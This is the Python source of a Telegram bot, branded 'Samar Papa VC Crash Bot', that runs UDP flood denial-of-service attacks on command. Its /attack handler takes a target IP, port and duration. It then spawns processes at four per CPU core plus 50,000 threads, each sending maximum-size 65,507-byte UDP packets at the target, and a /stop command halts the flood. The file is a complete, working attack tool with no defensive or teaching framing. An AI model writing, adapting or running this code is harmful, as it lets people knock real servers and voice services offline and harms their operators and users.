import os
import socket
import threading
import multiprocessing
import time
import asyncio
from dotenv import load_dotenv
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes
)

load_dotenv("Config.env")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

active_attacks = {}

def is_admin(user_id):
    return user_id == ADMIN_ID

# Worker process — max UDP packet size
def worker_process(host, port, stop_flag):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        s.connect((str(host), int(port)))
        payload = b"\x99" * 65507  # max UDP payload
        while not stop_flag.value:
            s.send(payload)
    except:
        pass
    finally:
        try: s.close()
        except: pass

def run_attack(host, port, duration, user_id):
    stop_flag = multiprocessing.Value('b', False)
    active_attacks[user_id]["stop_flag"] = stop_flag

    # Multiprocessing — CPU cores * 4
    procs = []
    cpu = multiprocessing.cpu_count() * 4

    for _ in range(cpu):
        p = multiprocessing.Process(
            target=worker_process,
            args=(host, port, stop_flag),
            daemon=True
        )
        p.start()
        procs.append(p)

    # Extra threads on top
    for _ in range(50000):
        threading.Thread(
            target=worker_process,
            args=(host, port, stop_flag),
            daemon=True
        ).start()

    time.sleep(duration)
    stop_flag.value = True

    for p in procs:
        try: p.terminate()
        except: pass

    active_attacks.pop(user_id, None)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💀 *Samar Papa VC Crash Bot*\n\n"
        "📌 Commands:\n"
        "`/attack <ip> <port> <seconds>`\n"
        "`/stop` — Attack band karo\n\n"
        "⚡ Max UDP | Multiprocessing",
        parse_mode="Markdown"
    )

# /attack
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❗ Usage: `/attack <ip> <port> <seconds>`",
            parse_mode="Markdown"
        )
        return

    host = args[0]
    port = int(args[1])
    duration = int(args[2])

    if user_id in active_attacks:
        await update.message.reply_text("⚠️ Already running.\nUse /stop first.")
        return

    active_attacks[user_id] = {}

    cpu = multiprocessing.cpu_count() * 4

    await update.message.reply_text(
        f"🚀 *Attack Launched!*\n\n"
        f"🎯 Target: `{host}:{port}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"💥 Processes: `{cpu}`\n"
        f"🔥 Threads: `50000`\n"
        f"📦 Packet: `65507 bytes`",
        parse_mode="Markdown"
    )

    threading.Thread(
        target=run_attack,
        args=(host, port, duration, user_id),
        daemon=True
    ).start()

    await asyncio.sleep(duration)

    if user_id not in active_attacks:
        await update.message.reply_text(
            f"✅ *Done!*\n`{host}:{port}` — `{duration}s` complete.",
            parse_mode="Markdown"
        )

# /stop
async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ Access denied.")
        return

    if user_id in active_attacks:
        try:
            active_attacks[user_id]["stop_flag"].value = True
        except:
            pass
        active_attacks.pop(user_id, None)
        await update.message.reply_text("🛑 Attack stopped.")
    else:
        await update.message.reply_text("⚠️ No active attack.")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    print("[*] Samar Papa Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()